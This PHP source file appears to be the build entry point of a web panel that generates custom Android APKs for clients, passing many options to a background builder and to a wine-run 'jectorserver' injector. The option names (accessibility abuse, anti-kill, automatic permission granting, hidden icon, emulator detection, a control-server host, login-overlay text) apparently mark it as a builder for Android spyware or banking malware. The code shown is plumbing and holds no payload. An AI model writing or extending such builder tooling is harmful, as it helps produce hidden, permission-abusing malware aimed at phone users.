<?php
/**
 * APK 构建入口文件
 * 使用 PHP ApkBuilder 替代原 Windows EXE
 */

require_once __DIR__ . '/ApkBuilder.php';

// ========== 兼容层: 原框架缺失的函数和常量 ==========
if (!defined('OP_Success')) define('OP_Success', 'success');
if (!defined('OP_Fail'))    define('OP_Fail', 'fail');

if (!function_exists('Format')) {
    function Format($message, $type = OP_Success) {
        return json_encode(['type' => $type, 'message' => $message], JSON_UNESCAPED_UNICODE);
    }
}

if (!function_exists('logError')) {
    function logError($th) {
        $logDir = __DIR__ . '/errors';
        if (!is_dir($logDir)) @mkdir($logDir, 0755, true);
        file_put_contents(
            $logDir . '/build-errors.log',
            date('Y-m-d H:i:s') . ' ' . $th->getMessage() . "\n",
            FILE_APPEND
        );
    }
}
// =================================================
function BuildStore(
    $appid,
    $userid,
    $clientname,
    $email,
    $mainActivity,
    $app_folder,
    $UserHost,
    $use_access,
    $use_antkill,
    $use_atoprims,
    $notifytitle,
    $notifymsg,
    $user_allprims,
    $user_blackprims,
    $buildtype,
    $appname,
    $appversion,
    $appicopath,
    $appurl,
    $logintitle,
    $logindis,
    $loginbtn,
    $lngshort,
    $hiddenapp,
    $noemulator,
    $installtype,
    $hide_type,
    $use_draw,
    $open_access,
    $descr_iption,
    $diao_type,
    $build_region = 'global'
): string {
    return BuildCustom(
        $appid, $userid, $clientname, $email, $mainActivity, $app_folder,
        $UserHost, $use_access, $use_antkill, $use_atoprims, $notifytitle,
        $notifymsg, $user_allprims, $user_blackprims, $buildtype, $appname,
        $appversion, $appicopath, $appurl, $logintitle, $logindis, $loginbtn,
        $lngshort, $hiddenapp, $noemulator, $installtype, $hide_type,
        $use_draw, $open_access, $descr_iption, $diao_type, $build_region
    );
}

function BuildCustom(
    $appid,
    $userid,
    $clientname,
    $email,
    $mainActivity,
    $app_folder,
    $UserHost,
    $use_access,
    $use_antkill,
    $use_atoprims,
    $notifytitle,
    $notifymsg,
    $user_allprims,
    $user_blackprims,
    $buildtype,
    $appname,
    $appversion,
    $appicopath,
    $appurl,
    $logintitle,
    $logindis,
    $loginbtn,
    $lngshort,
    $hiddenapp,
    $noemulator,
    $installtype,
    $hide_type,
    $use_draw,
    $open_access,
    $descr_iption,
    $diao_type,
    $build_region = 'global'
): string {
    return startBuild(
        $appid, $userid, $clientname, $email, $mainActivity, $app_folder,
        $UserHost, $use_access, $use_antkill, $use_atoprims, $notifytitle,
        $notifymsg, $user_allprims, $user_blackprims, $buildtype, $appname,
        $appversion, $appicopath, $appurl, $logintitle, $logindis, $loginbtn,
        $lngshort, $hiddenapp, $noemulator, $installtype, $hide_type,
        $use_draw, $open_access, $descr_iption, $diao_type, $build_region
    );
}

/**
 * 统一的构建启动函数
 */
function startBuild(
    $appid, $userid, $clientname, $email, $mainActivity, $app_folder,
    $UserHost, $use_access, $use_antkill, $use_atoprims, $notifytitle,
    $notifymsg, $user_allprims, $user_blackprims, $buildtype, $appname,
    $appversion, $appicopath, $appurl, $logintitle, $logindis, $loginbtn,
    $lngshort, $hiddenapp, $noemulator, $installtype, $hide_type,
    $use_draw, $open_access, $descr_iption, $diao_type,
    $build_region = 'global'
): string {
    try {
        $logDir = __DIR__ . '/logs/build';
        if (!is_dir($logDir)) @mkdir($logDir, 0755, true);
        $debug_log = $logDir . '/build_debug.log';

        file_put_contents($debug_log, date('Y-m-d H:i:s') . " 开始构建 - appid: $appid, userid: $userid\n", FILE_APPEND);
        
        // 准备参数
        $args = [
            $appid, $userid, $clientname, $email, $mainActivity, $app_folder,
            $UserHost, $use_access, $use_antkill, $use_atoprims, $notifytitle,
            $notifymsg, $user_allprims, $user_blackprims, $buildtype, $appname,
            $appversion, $appicopath, $appurl, $logintitle, $logindis, $loginbtn,
            $lngshort, $hiddenapp, $noemulator, $installtype, $hide_type,
            $use_draw, $open_access, $descr_iption, $diao_type, $build_region
        ];
        
        // 使用 PHP 后台构建（Docker 下用 php，宝塔用固定路径）
        $phpPath = getenv('PHP_PATH') ?: (file_exists('/www/server/php/81/bin/php') ? '/www/server/php/81/bin/php' : 'php');
        $builderPath = __DIR__ . '/ApkBuilder.php';
        $logFile = $logDir . '/apkbuild_' . $userid . '.log';
        
        // 构建命令 - 后台运行
        $encodedArgs = array_map('base64_encode', $args);
        $command = $phpPath . ' ' . escapeshellarg($builderPath) . ' ' . 
                   implode(' ', array_map('escapeshellarg', $encodedArgs));
        
        // 后台执行 - 构建命令已在上方拼装好
        file_put_contents($debug_log, date('Y-m-d H:i:s') . " 命令: $command\n", FILE_APPEND);
        
        if (PHP_OS_FAMILY === 'Windows') {
            // Windows: 用 popen + start /B 真正后台运行（不阻塞服务器）
            $fullCmd = 'start /B "" ' . $command . ' > ' . escapeshellarg($logFile) . ' 2>&1';
            $handle = popen($fullCmd, 'r');
            if ($handle !== false) {
                pclose($handle);
                $return_var = 0;
            } else {
                $return_var = -1;
            }
        } else {
            // Linux: & 后台
            $command .= ' > ' . escapeshellarg($logFile) . ' 2>&1 &';
            exec($command, $output, $return_var);
        }
        
        file_put_contents($debug_log, date('Y-m-d H:i:s') . " 启动结果: $return_var\n", FILE_APPEND);
        
        // 返回成功消息，包含 appid（包名）
        return Format("appid: $appid\n您的应用正在构建中，请前往：菜单 > 仪表盘 > 应用 查看。", OP_Success);
        
    } catch (\Throwable $th) {
        logError($th);
        if (isset($logDir)) {
            file_put_contents($logDir . '/build_debug.log', date('Y-m-d H:i:s') . " 错误: " . $th->getMessage() . "\n", FILE_APPEND);
        }
        return Format("构建启动失败: " . $th->getMessage(), OP_Fail);
    }
}

function excutejector($arguments)
{
    try {
        $output = [];
        $return_var = 0;

        // 暂时保留原逻辑（如果需要）
        $command = "cd " . escapeshellarg(__DIR__ . "/jectorserver") . " && WINEPREFIX=/tmp/wine-www xvfb-run -a wine jectorserver.exe ";
        
        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }

        exec($command, $output, $return_var);

        if ($return_var !== 0) {
            return Format("命令执行错误，返回代码: $return_var", OP_Fail);
        } else {
            if (!empty($output)) {
                return Format($output[0], OP_Success);
            } else {
                return Format("未知的 jector 响应。", OP_Fail);
            }
        }
    } catch (\Throwable $th) {
        logError($th);
        return Format("出错了，请稍后再试", OP_Fail);
    }
}

